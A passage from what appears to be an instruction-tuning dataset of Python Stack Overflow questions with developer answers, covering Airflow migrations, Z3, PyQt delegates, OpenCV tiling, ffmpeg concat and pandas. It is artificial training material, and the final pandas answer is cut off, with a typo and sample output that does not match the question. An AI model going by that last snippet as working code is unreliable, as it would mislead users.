&lt;loc&gt;https:\/\/www.h.coml&lt;\/loc&gt;\n&lt;\/url&gt;\n'''\ndoc = SimplifiedDoc(html)\nurls = doc.urls\nstartTime = time.strptime(\"2020-2-1\", \"%Y-%m-%d\")\nremoveList=[]\nfor url in urls:\n  lastmod = url.lastmod.html # Get lastmod\n  tm = time.strptime(lastmod[0:lastmod.find('+')], \"%Y-%m-%dT%H:%M:%S\")\n  if tm&lt;startTime:\n    removeList.append(url)\nn = len(removeList)\nhtml = doc.html\nwhile n&gt;0: # Delete data in reverse order\n  n-=1\n  url = removeList[n]\n  html = html[0:url._start]+html[url._end:] # Delete url data\nprint (html.strip())\n<\/code><\/pre>\n\n<p>Result:<\/p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;url&gt;\n  &lt;lastmod&gt;2020-02-04T16:21:00+01:00&lt;\/lastmod&gt;\n  &lt;loc&gt;https:\/\/www.h.com&lt;\/loc&gt;\n&lt;\/url&gt;\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Airflow - alembic.util.exc.CommandError: Can't locate revision identified by 'a13f7613ad25'<pre><code>webserver_1  | The above exception was the direct cause of the following exception:\nwebserver_1  | \nwebserver_1  | Traceback (most recent call last):\nwebserver_1  |   File &quot;\/usr\/local\/bin\/airflow&quot;, line 8, in &lt;module&gt;\nwebserver_1  |     sys.exit(main())\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/airflow\/__main__.py&quot;, line 40, in main\nwebserver_1  |     args.func(args)\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/airflow\/cli\/cli_parser.py&quot;, line 48, in command\nwebserver_1  |     return func(*args, **kwargs)\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/airflow\/cli\/commands\/db_command.py&quot;, line 31, in initdb\nwebserver_1  |     db.initdb()\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/airflow\/utils\/db.py&quot;, line 549, in initdb\nwebserver_1  |     upgradedb()\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/airflow\/utils\/db.py&quot;, line 684, in upgradedb\nwebserver_1  |     command.upgrade(config, 'heads')\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/command.py&quot;, line 294, in upgrade\nwebserver_1  |     script.run_env()\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/script\/base.py&quot;, line 490, in run_env\nwebserver_1  |     util.load_python_file(self.dir, &quot;env.py&quot;)\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/util\/pyfiles.py&quot;, line 97, in load_python_file\nwebserver_1  |     module = load_module_py(module_id, path)\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/util\/compat.py&quot;, line 184, in load_module_py\nwebserver_1  |     spec.loader.exec_module(module)\nwebserver_1  |   File &quot;&lt;frozen importlib._bootstrap_external&gt;&quot;, line 728, in exec_module\nwebserver_1  |   File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 219, in _call_with_frames_removed\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/airflow\/migrations\/env.py&quot;, line 108, in &lt;module&gt;\nwebserver_1  |     run_migrations_online()\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/airflow\/migrations\/env.py&quot;, line 102, in run_migrations_online\nwebserver_1  |     context.run_migrations()\nwebserver_1  |   File &quot;&lt;string&gt;&quot;, line 8, in run_migrations\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/runtime\/environment.py&quot;, line 813, in run_migrations\nwebserver_1  |     self.get_context().run_migrations(**kw)\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/runtime\/migration.py&quot;, line 549, in run_migrations\nwebserver_1  |     for step in self._migrations_fn(heads, self):\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/command.py&quot;, line 283, in upgrade\nwebserver_1  |     return script._upgrade_revs(revision, rev)\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/script\/base.py&quot;, line 370, in _upgrade_revs\nwebserver_1  |     for script in reversed(list(revs))\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/contextlib.py&quot;, line 130, in __exit__\nwebserver_1  |     self.gen.throw(type, value, traceback)\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/script\/base.py&quot;, line 203, in _catch_revision_errors\nwebserver_1  |     compat.raise_(util.CommandError(resolution), from_=re)\nwebserver_1  |   File &quot;\/usr\/local\/lib\/python3.7\/site-packages\/alembic\/util\/compat.py&quot;, line 296, in raise_\nwebserver_1  |     raise exception\nwebserver_1  | alembic.util.exc.CommandError: Can't locate revision identified by 'a13f7613ad25'\n<\/code><\/pre>\n<p>This error is currently causing us all sorts of frustrations with our Airflow deployment. We run airflow in docker and, oddly enough, this issue is happening for myself but not my coworkers, making it quite challenging to debug. We found <a href=\"https:\/\/stackoverflow.com\/questions\/32311366\/alembic-util-command-error-cant-find-identifier\">alembic util command error can&#39;t find identifier<\/a> however it is not super clear what we can do to resolve the error.<\/p>","output_text":"<p>You should wipe your database and recreate it from scratch (<code>airflow db reset<\/code>). Apparently the database you have have been corrupted - this could have happened if you used some development version of Arirflow or run some older version airflow 1.10 on Airflow 2 or the other way round.<\/p>\n<p>I presume (since you are talking about <code>co-worker's<\/code> and <code>your<\/code> database - those are all development databases, so you should be able to reset them from scratch.<\/p>\n<p>If this is a development database which uses sqlite, what can also help is to delete the sqlite3 file (you will find it in <code>${AIRFLOW_HOME}<\/code> directory.  This will drop the database and airflow will create one from scratch automatically when starting.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to model in Z3py<p>I have a total of seven  (A, B, C, D, E, r, c) Z3 Boolean variables, where A, B, C, D, E represent the edges from a point, represented as a black dot in the following Fig.1.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/zXSwK.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/zXSwK.png\" alt=\"Fig.1\" \/><\/a><\/p>\n<p>The remaining two variables, i.e,  r and c are the variables for the black dot point, whose values depend on edges values as follows:<\/p>\n<p>The conditions for variable \u2018r\u2019:\nCase1: If A is true then only one variable from C or D can be true\nCase2: Similarly, if B is true then only variable either C or D can be true.\nThe variable r can be true only if one of the either Case 1 or Case 2 is true and r value should always be True.\nThese conditions are solved in Z3 solver as:<\/p>\n<pre><code>s.add(Implies(A, Xor(C,D) ))\ns.add(Implies(B, Xor(C,D) )) \ns.add(r1 == Xor(A, B) )\ns.add(r1 == True)\n<\/code><\/pre>\n<p>Now I have to include the following conditions for variable \u2018c\u2019 in Z3 solver:<\/p>\n<p>The variable \u2018c\u2019 can be true or false.\nAnd \u2018c\u2019 will be true only if any of the following conditions meet:<\/p>\n<p>Case 3: if A and C are True then c will be true if both E and D are true<\/p>\n<p>Case 4: if A and D are True then c will be true if both E and C are true<\/p>\n<p>Case 5: if B and C are True then c will be true if both E and D are true<\/p>\n<p>Case 6: if B and D are True then c will be true if both E and C are true\n<a href=\"https:\/\/i.stack.imgur.com\/rIiPP.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/rIiPP.png\" alt=\"Cases for variable 'c'\" \/><\/a><\/p>\n<p>How to add these conditions as I am not able to model the conditions for \u2018c\u2019 variable in Z3 solver.<\/p>","output_text":"<p>Your description is a bit hard to follow, but you should be able to express these almost literally as follows. (I added some inline comments so you can follow the coding logic and modify as appropriate.)<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from z3 import *\n\nA, B, C, D, E, r, c = Bools('A B C D E r c')\n\ns = Solver()\n\n# Case 1\nCase1 = Implies(A, Xor(C,D))\ns.add(Case1)\n\n# Case 2\nCase2 = Implies(B, Xor(C,D))\ns.add(Case2)\n\n# Conditions for r. Your description is a bit confusing here,\n# as it says both `r` is true, and if one of Case1 or Case2\n# is true. This suggests one of Case1 or Case2 must be true,\n# though it's not clear to me why described it in this complex\n# way. Modify accordingly.\ns.add(r)\ns.add(Or(Case1, Case2))\n\n# Case 3: if A and C are True then c will be true if both E and D are true\ns.add(Implies(And(A, C), Implies(And(E, D), c)))\n\n# Case 4: if A and D are True then c will be true if both E and C are true\ns.add(Implies(And(A, D), Implies(And(E, C), c)))\n\n# Case 5: if B and C are True then c will be true if both E and D are true\ns.add(Implies(And(B, C), Implies(And(E, D), c)))\n\n# Case 6: if B and D are True then c will be true if both E and C are true\ns.add(Implies(And(B, D), Implies(And(E, C), c)))\n\nvars = [A, B, C, D, E, r, c]\nwhile s.check() == sat:\n    m = s.model()\n    for v in vars:\n      print(&quot;%s = %5s&quot; % (v, m.evaluate(v, model_completion = True))),\n    print\n    s.add(Or([p != v for p, v in [(v, m.evaluate(v, model_completion = True)) for v in vars]]))\n<\/code><\/pre>\n<p>When run, this prints:<\/p>\n<pre><code>A = False B = False C = False D = False E = False r =  True c = False\nA = False B = False C =  True D = False E = False r =  True c = False\nA = False B = False C =  True D =  True E = False r =  True c = False\nA = False B = False C = False D =  True E = False r =  True c =  True\nA = False B = False C =  True D = False E = False r =  True c =  True\nA = False B = False C =  True D =  True E = False r =  True c =  True\nA = False B =  True C = False D =  True E = False r =  True c =  True\nA = False B =  True C =  True D = False E = False r =  True c = False\nA = False B =  True C =  True D = False E = False r =  True c =  True\nA =  True B =  True C =  True D = False E = False r =  True c =  True\nA =  True B = False C =  True D = False E =  True r =  True c =  True\nA = False B =  True C =  True D = False E =  True r =  True c =  True\nA =  True B =  True C =  True D = False E =  True r =  True c = False\nA =  True B =  True C =  True D = False E =  True r =  True c =  True\nA = False B =  True C = False D =  True E =  True r =  True c =  True\nA = False B =  True C =  True D = False E =  True r =  True c = False\nA = False B = False C =  True D = False E =  True r =  True c = False\nA = False B = False C =  True D =  True E =  True r =  True c = False\nA = False B = False C = False D =  True E = False r =  True c = False\nA = False B = False C = False D =  True E =  True r =  True c = False\nA = False B = False C = False D = False E =  True r =  True c = False\nA = False B = False C = False D = False E =  True r =  True c =  True\nA = False B = False C = False D = False E = False r =  True c =  True\nA = False B = False C = False D =  True E =  True r =  True c =  True\nA =  True B = False C = False D =  True E =  True r =  True c =  True\nA =  True B = False C = False D =  True E =  True r =  True c = False\nA =  True B =  True C = False D =  True E = False r =  True c = False\nA =  True B =  True C = False D =  True E =  True r =  True c = False\nA = False B =  True C = False D =  True E = False r =  True c = False\nA =  True B =  True C = False D =  True E = False r =  True c =  True\nA =  True B = False C = False D =  True E = False r =  True c =  True\nA =  True B = False C =  True D = False E = False r =  True c =  True\nA =  True B = False C =  True D = False E = False r =  True c = False\nA =  True B = False C = False D =  True E = False r =  True c = False\nA = False B =  True C = False D =  True E =  True r =  True c = False\nA = False B = False C =  True D =  True E =  True r =  True c =  True\nA = False B = False C =  True D = False E =  True r =  True c =  True\nA =  True B =  True C =  True D = False E = False r =  True c = False\nA =  True B = False C =  True D = False E =  True r =  True c = False\nA =  True B =  True C = False D =  True E =  True r =  True c =  True\n<\/code><\/pre>\n<p>This prints all possible models. You can of course constrain it further.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n QStyledItemDelegate's option is not updating<p>I ran into a problem while using PyQt5. I have a list with <code>QStyledItemDelegate<\/code> class painting its items. Here is the minimal reproducible example:<\/p>\n<pre><code>import sys\nfrom PyQt5.QtCore import (\n    QAbstractListModel,\n    Qt,\n    QSize,\n    QRect,\n    QRectF,\n)\nfrom PyQt5.QtGui import (\n    QPainter,\n    QFontMetrics,\n    QFont,\n    QTextDocument,\n    QTextOption,\n    QPen,\n)\nfrom PyQt5.QtWidgets import (\n    QApplication,\n    QListView,\n    QMainWindow,\n    QStyledItemDelegate,\n)\n\nwindow_width = 0\n\nclass MessageDelegate(QStyledItemDelegate):\n    WINDOW_PADDING = 30\n    font = QFont(&quot;Times&quot;, 14)\n\n    def __init__(self, *args, **kwargs):\n        super(MessageDelegate, self).__init__(*args, **kwargs)\n\n    def paint(self, painter, option, index):\n        msg = index.model().data(index, Qt.DisplayRole)\n        print(&quot;paint &quot; + str(index.row()) + &quot; &quot; + str(option.rect.top()))\n        field = QRect(option.rect)\n        doc = QTextDocument(msg)\n        doc.setDocumentMargin(0)\n        opt = QTextOption()\n        opt.setWrapMode(opt.WrapAtWordBoundaryOrAnywhere)\n        doc.setDefaultTextOption(opt)\n        doc.setDefaultFont(self.font)\n        doc.setTextWidth(field.size().width())\n        field.setHeight(int(doc.size().height()))\n        field.setWidth(int(doc.idealWidth()))\n        painter.setPen(Qt.gray)\n        painter.setFont(self.font)\n        painter.translate(field.x(), field.y())\n        textrectf = QRectF(field)\n        textrectf.moveTo(0, 0)\n        doc.drawContents(painter, textrectf)\n        painter.translate(-field.x(), -field.y())\n\n    def sizeHint(self, option, index):\n        global window_width\n        msg = index.model().data(index, Qt.DisplayRole)\n        doc = QTextDocument(msg)\n        doc.setDocumentMargin(0)\n        opt = QTextOption()\n        opt.setWrapMode(opt.WrapAtWordBoundaryOrAnywhere)\n        doc.setDefaultTextOption(opt)\n        doc.setDefaultFont(self.font)\n        doc.setTextWidth(window_width - self.WINDOW_PADDING)\n        print(&quot;sizeHint &quot; + str(index.row()) + &quot; &quot; + str(int(doc.size().height())))\n        return QSize(0, int(doc.size().height()))\n\n\nclass MessageModel(QAbstractListModel):\n    def __init__(self, *args, **kwargs):\n        super(MessageModel, self).__init__(*args, **kwargs)\n        self.messages = []\n\n    def data(self, index, role):\n        if role == Qt.DisplayRole:\n            return self.messages[index.row()]\n\n    def rowCount(self, index):\n        return len(self.messages)\n\n    def add_message(self, text):\n        if text:\n            self.messages.append(text)\n            self.layoutChanged.emit()\n\n\nclass Dialog(QMainWindow):\n\n    def __init__(self):\n        global window_width\n        super(Dialog, self).__init__()\n        self.setMinimumSize(int(QApplication.primaryScreen().size().width() * 0.1), int(QApplication.primaryScreen().size().height() * 0.2))\n        self.resize(int(QApplication.primaryScreen().size().width() * 0.3), int(QApplication.primaryScreen().size().height() * 0.5))\n        window_width = int(QApplication.primaryScreen().size().width() * 0.3)\n        self.messages = QListView()\n        self.messages.setItemDelegate(MessageDelegate())\n        self.model = MessageModel()\n        self.messages.setModel(self.model)\n        self.model.add_message(&quot;qwerty qwerty qwerty qwerty qwerty qwerty qwerty qwerty qwerty qwerty qwerty qwerty qwerty qwerty&quot;)\n        self.model.add_message(&quot;abcdef&quot;)\n        self.setCentralWidget(self.messages)\n\n    def resizeEvent(self, event):\n        global window_width\n        super(Dialog, self).resizeEvent(event)\n        window_width = self.size().width()\n\napp = QApplication(sys.argv)\nwindow = Dialog()\nwindow.show()\napp.exec_()\n<\/code><\/pre>\n<p>As you can see I am printing the height of each item before returning it in <code>sizeHint<\/code>. I also print the Y coordinate of <code>option.rect<\/code> received in paint. As I have only two items, I expect the coordinate of the item1 to be equal to the height of item0. And at first it seems to be working out:<\/p>\n<pre><code>sizeHint 0 23\npaint 0 0\nsizeHint 1 23\npaint 1 23\n<\/code><\/pre>\n<p>However, as I narrow down the window the height in <code>sizeHint<\/code> starts to grow (because the narrow window can't fit all the contents) but the Y coordinate of <code>option.rect<\/code> stays the same:<\/p>\n<pre><code>sizeHint 0 46\npaint 0 0\nsizeHint 1 23\npaint 1 23\n<\/code><\/pre>\n<p>Even when I get to the third line the position of <code>option.rect<\/code> is not updating:<\/p>\n<pre><code>sizeHint 0 69\npaint 0 0\nsizeHint 1 23\npaint 1 23\n<\/code><\/pre>\n<p>As a result of that item1 overlaps item0 instead of moving down.<\/p>\n<p><img src=\"https:\/\/i.stack.imgur.com\/8G7Zd.png\" alt=\"\" \/><\/p>\n<p>Is there a way to update <code>option.rect<\/code> position as soon as the size of one of previous items changes?<\/p>","output_text":"<p>When the size hint of an index changes, you need to emit <code>MessageDelegate.sizeHintChanged<\/code> to let the layout manager of the items know that it needs to redistribute the items. In this case the height of the items only changes when the window is resized, so what you could do is to emit a (custom) signal in <code>Dialog.resizeEvent<\/code> and connect it to <code>MessageDelegate.sizeHintChanged<\/code>. For this <code>Dialog<\/code> would need to be modified according to something like this<\/p>\n<pre><code>from PyQt5.QtCore import pyqtSignal, QModelIndex\n\nclass Dialog(QMainWindow):\n\n    # custom signal for signalling when window is resized\n    width_changed = pyqtSignal()\n\n    def __init__(self):\n        ... as before ...\n        self.messages = QListView()\n        delegate = MessageDelegate()\n        self.messages.setItemDelegate(delegate)\n        # Connect custom signal to delegate.sizeHintChanged. \n        # This signal expects a ModelIndex for which we take the root, i.e. QModelIndex()  \n        self.width_changed.connect(lambda : delegate.sizeHintChanged.emit(QModelIndex()))\n        .... rest as before ....\n\n    def resizeEvent(self, event):\n        global window_width\n        super(Dialog, self).resizeEvent(event)\n        window_width = self.size().width()\n        # emit the custom signal\n        self.width_changed.emit()\n<\/code><\/pre>\n<p>In the code above I didn't modify anything else in the code, but you could opt to get rid of the global <code>window_width<\/code> variable by modifying the custom signal to emit the new width and create a slot in <code>MessageDelegate<\/code> to assign the new width to an instance variable.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n 'int' object not callable when opening a file in python<p>I am getting what seems to be an odd error when trying to open a file in python.  I am simply trying to open a csv:<\/p>\n<p><code>with open(filename, 'a') as history:<\/code><\/p>\n<p>filename is simply a string pointing the file:<\/p>\n<p><code>filename = file_path + &quot;\\\\dashboards\\\\&quot; + csv_file<\/code><\/p>\n<p>it is identified as a string in python, but whenever I get to the open statement, it returns:<\/p>\n<p><code>TypeError}'int' object not callable<\/code><\/p>\n<p>That seems odd as it is just a csv file, with a header.  Has anyone run across this before?\n``<\/p>","output_text":"<p>It looks like you may have defined <code>open<\/code> as a variable somewhere else with an int value. This is causing the error message.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to put images on another image in order?<p>In below example there are three images on a white background in order. How to achieve this in python using CV2 or PIL or any working code.<\/p>\n<p>Thank you.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/Flm41.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Flm41.jpg\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Image must be aligned according to aspect ratio.<\/p>\n<p>Input = 3 images with BG,<\/p>\n<p>Output = single image as shown in above picture<\/p>\n<p>UPDATE !!!!<\/p>\n<p>Each and every loop only one image gets pasted on BG.<\/p>\n<pre><code>from PIL import Image\nimport cv2\nimport numpy as np\n\nd=0\nfolder = 'save'\nimage_paths = []\nfor path, subdirs, files in os.walk(folder):\n    for filename in files:\n        f = os.path.join(path, filename)\n        if f.endswith(&quot;.jpg&quot;):\n            image_paths.append(f)\n        if f.endswith(&quot;.png&quot;):\n            image_paths.append(f)\n        if f.endswith(&quot;.JPG&quot;):\n            image_paths.append(f)\n        if f.endswith(&quot;.PNG&quot;):\n            image_paths.append(f)  \n        if f.endswith(&quot;.jpeg&quot;):\n            image_paths.append(f)    \n        if f.endswith(&quot;.JPEG&quot;):\n            image_paths.append(f)\n          \n\nfor image in image_paths:\n    image = cv2.imread(image)\n    r = 720.0 \/ image.shape[1]\n    dim = (720, int(image.shape[0] * r))\n\n    resized = cv2.resize(image, dim)\n    #resized = resized[:,:,0]\n    h, w, z = resized.shape\n\n    back = cv2.imread('template.jpg')\n\n    yoff = round((1080-h)\/4)\n    xoff = round((1920-w)\/6)\n\n    d+=1\n    result = back.copy()\n    result[yoff:yoff+h, xoff:xoff+w] = resized\n    #result = np.stack((result)*3)\n    cv2.imwrite('saves\/resized_centered_%d.jpg'%d,  result)\n<\/code><\/pre>\n<p>So multiple images in input gets pasted in a background but the thing is, i want three images to paste in the background instead of one image in order.<\/p>\n<p>NOTE: THE IMAGE ON TOP IS JUST TO REPRESENT MY HELP !!! YOU CAN TELL ME WHATEVER POSSIBLE APART FROM THAT !!!<\/p>\n<p>This line of code moves the image towards top-left and seated properly but likewise i need two more image to be seated on top-right and as well as bottom.<\/p>\n<pre><code>yoff = round((1080-h)\/4)\nxoff = round((1920-w)\/6) \n<\/code><\/pre>","output_text":"<p>I assume some template like this:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/zPN8d.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/zPN8d.png\" alt=\"Template\" \/><\/a><\/p>\n<p>The &quot;final image&quot; has dimensions <code>(1920, 1080)<\/code> (cf. your calculations on <code>xoff<\/code> and <code>yoff<\/code>). Since you wrote, you want to keep the aspect ratio for each &quot;single image&quot;, you'd need to check both cases: Resize w.r.t. to the single image's width, and if the resulting height is too large, re-resize w.r.t. to the single image's height.<\/p>\n<p>What's left is to track the number of single images per final image inside the loop, and set up proper <code>xoff<\/code> and <code>yoff<\/code> values for each of the three cases. Maybe, looking at the code here helps more than long explanations:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import cv2\nimport numpy as np\nimport os\n\nfolder = 'path\/to\/your\/images'\nimage_paths = []\nfor path, subdirs, files in os.walk(folder):\n    for filename in files:\n        f = os.path.join(path, filename)\n        if f.endswith((&quot;.jpg&quot;, &quot;.png&quot;, &quot;.JPG&quot;, &quot;.PNG&quot;, &quot;.jpeg&quot;, &quot;.JPEG&quot;)):\n            image_paths.append(f)\n\nd = 0                                               # Final image counter\ne = 0                                               # Single image counter\nback = np.ones((1080, 1920, 3), np.uint8) * 255     # Background\nresult = back.copy()                                # Final image\nfor i, image in enumerate(image_paths):\n\n    # Read image\n    image = cv2.imread(image)\n    h, w = image.shape[:2]\n\n    # First two single images: Enforce subimage with h_max = 480 and w_max = 900\n    if e &lt;= 1:\n        r = 900.0 \/ w\n        dim = (900, int(h * r))\n        if dim[1] &gt; 480:\n            r = 480.0 \/ h\n            dim = (int(w * r), 480)\n        resized = cv2.resize(image, dim)\n        hr, wr = resized.shape[:2]\n        x_off = 40\n        if e == 0:\n            y_off = 40\n        else:\n            y_off = 560\n\n    # Third single image: Enforce subimage with h_max = 1000 and w_max = 900\n    else:\n        r = 900.0 \/ w\n        dim = (900, int(h * r))\n        if dim[1] &gt; 1000:\n            r = 1000.0 \/ h\n            dim = (int(w * r), 1000)\n        resized = cv2.resize(image, dim)\n        hr, wr = resized.shape[:2]\n        x_off, y_off = 980, 40\n\n    # Add single image to final image\n    result[y_off:y_off + hr, x_off:x_off + wr] = resized\n\n    # Increment single image counter\n    e += 1\n\n    # After three single images: Write final image; start new final image\n    if (e == 3) or (i == (len(image_paths) - 1)):\n        cv2.imwrite('resized_centered_%d.jpg' % d, result)\n        result = back.copy()\n        d += 1\n        e = 0\n<\/code><\/pre>\n<p>For some random images from my StackOverflow archive, I get the following outputs:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/KzEyx.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/KzEyx.jpg\" alt=\"Example #1\" \/><\/a><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/8K5g3.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/8K5g3.jpg\" alt=\"Example #2\" \/><\/a><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/p2kNR.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/p2kNR.jpg\" alt=\"Example #3\" \/><\/a><\/p>\n<p>If you want to have different sized boxes or margins around or between the single images, just adapt the corresponding values in the code.<\/p>\n<pre class=\"lang-none prettyprint-override\"><code>----------------------------------------\nSystem information\n----------------------------------------\nPlatform:      Windows-10-10.0.16299-SP0\nPython:        3.9.1\nPyCharm:       2021.1.1\nNumPy:         1.20.2\nOpenCV:        4.5.1\n----------------------------------------\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n FFMPEG concat cutting audio off after certain clip<p>So I am creating multiple video clips in Python using FFMPEG, I am then trying to concat these together. I create multiple videos named result1000, result1001 etc, then I create a transition effect I want to layer between these videos. The result1000, result1001... etc concat together perfectly fine, however inserting the transition effect between them causes every clip after the first transition to lose audio.<\/p>\n\n<p><strong>Creating the transiton<\/strong><\/p>\n\n<pre><code>ffmpeg -loop 1 -y -i media\/templates\/bg.png -i media\/swoosh_sound.mp3 -shortest -acodec copy -vcodec libx264rgb output\/swoosh.mp4\n<\/code><\/pre>\n\n<p><strong>Creating video clips<\/strong><\/p>\n\n<pre><code>ffmpeg -loop1 -y -i image_files\/image+str(1000+i)+.png -i audio_files\/audio+str(1000+i)+.mp3 -shortest -acodec copy -vcodec libx264rgb output\/result+str(1000+i)+.mp4\n<\/code><\/pre>\n\n<p>The <em>ffmpeg_files.txt<\/em> then looks something like this <\/p>\n\n<pre><code>file 'output\/result1000.mp4'\nfile 'output\/result1001.mp4'\nfile 'output\/result1002.mp4'\nfile 'output\/result1003.mp4'\nfile 'output\/result1004.mp4'\nfile 'output\/swoosh.mp4'\nfile 'output\/result1005.mp4'\nfile 'output\/result1006.mp4'\n<\/code><\/pre>\n\n<p>and the concat command im using is <\/p>\n\n<pre><code>ffmpeg -f concat -safe 0 -i ffmpeg_files.txt output\/no_bg_out.mp4\n<\/code><\/pre>\n\n<p>In console on running the concat comment it will say <\/p>\n\n<pre><code>[mov,mp4,m4a,3gp,3g2,mj2 @ 000001f289b44c40] Auto-inserting h264_mp4toannexb bitstream filter\n<\/code><\/pre>\n\n<p>for each <em>resultXXXX<\/em> clip, then as soon as it reaches a transition clip it starts spamming <\/p>\n\n<pre><code>[mp4 @ 000001aa093ad100] Non-monotonous DTS in output stream 0:1; previous: 13619623, current: 8777816; changing to 13619624. This may result in incorrect timestamps in the output file.\n<\/code><\/pre>\n\n<p>I have read over the solutions mentioned <a href=\"https:\/\/forum.videohelp.com\/threads\/390400-ffmpeg-throwing-NNon-monotonous-DTS-in-output-stream\" rel=\"nofollow noreferrer\">Here<\/a> but none of them seem to solve my issue. It should be noted that all video clips are created from <em>.mp3<\/em> audio files and <em>.png<\/em> image files.<\/p>","output_text":"<p>All attributes must match, but <code>swoosh.mp4<\/code> varies from the rest with a different audio sample rate and channel layout. Re-encode the audio and try again:<\/p>\n\n<pre class=\"lang-none prettyprint-override\"><code>ffmpeg -i swoosh.mp4 -c:v copy -c:a libmp3lame -ar 24000 -ac 1 -b:a 32k swoosh2.mp4\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python concatanate sheets and add sheet specific values to results<p>I have an excel workbook with x number of sheets that follows the same format<\/p>\n<p>Sheet 1<\/p>\n<pre><code>|         A      |   B   |   c   |   D   |   E   |   F\n1\n2    Comp Name: XYZ\n3    Client Name |   Id  |   val\n4      Ben            1       50\n5      Tom            2       43\n6      Yin            3       12\n<\/code><\/pre>\n<p>Sheet 2<\/p>\n<pre><code>|         A      |   B   |   c   |   D   |   E   |   F\n1\n2    Comp Name: ABC\n3    Client Name |   Id  |   val\n4      Liam           4       98\n5      Jin            5       23\n6      Paul           6       55\n<\/code><\/pre>\n<p>...<\/p>\n<p>Sheet x<\/p>\n<pre><code>|         A      |   B   |   c   |   D   |   E   |   F\n1\n2    Comp Name: PQR\n3    Client Name |   Id  |   val\n4      Abba           7       41\n5      Ram            8       56\n6      Mick           9       77\n<\/code><\/pre>\n<p>I'm attempting to concatenate the sheets as a data-frame while also adding the company name as another column.\nI googled and figured out how I can concatenate which is<\/p>\n<pre><code> pd.concat(pd.read_excel(path, skiprows=range(1, 2),  sheet_name=None, usecols='A:C',header=1), ignore_index=True)\n<\/code><\/pre>\n<p>This provides the concatenated rows.<\/p>\n<p>But I'm stuck at the point where I need to get the company name as another column for each row of the sheet. My idea is that I loop through the results from read_excel, get the A2 value and store it as another new column for that sheet.\nThe ideal results I'm looking for a data-frame as follows<\/p>\n<pre><code>Client Name    |    Id     |     Val     |     Comp Name\n     Ben            1            50                XYZ\n     Tom            2            43                XYZ                \n     Yin            3            12                XYZ\n     Liam           4            98                ABC\n     Jin            5            23                ABC                \n     Paul           6            55                ABC\n ...\n     Abba           7            41                PQR\n     Ram            8            56                PQR                \n     Mick           9            77                PQR\n<\/code><\/pre>\n<p>I would greatly appreciate a path to the solution<\/p>","output_text":"<p>This works for me -<\/p>\n<pre><code>In [1]: import pandas as pd\nIn [2]: excel_obj = pd.ExcelFile(&quot;clients.xlsx&quot;)\nIn [3]: sheet_data = []\nIn [4]: for sheet in excel_obj.sheet_names:\n   ...:     df = pd.read_excel(excel_obj, sheet_name=sheet)\n   ...:     *_, comp_name = df.iloc[\n   ...:         0, 0\n   ...:     ].split()  # Assuming that company name has no space, else use a different logic\n   ...:     data = df.iloc[2:, :]\n   ...:     data.columns = df.iloc[1, :].tolist()\n   ...:     data[&quot;Comp Name&quot;] = comp_name\n   ...:     sheet_data.append(dat\nIn [5]: pd.concat(sheet_data)\nOut[5]:\n  Client Name Id val Comp Name\n2         Ben  1  50       XYZ\n3         Tom  2  43       XYZ\n4         Yin  3  12       XYZ\n2         Tom  1   7       PQR\n3       Jerry 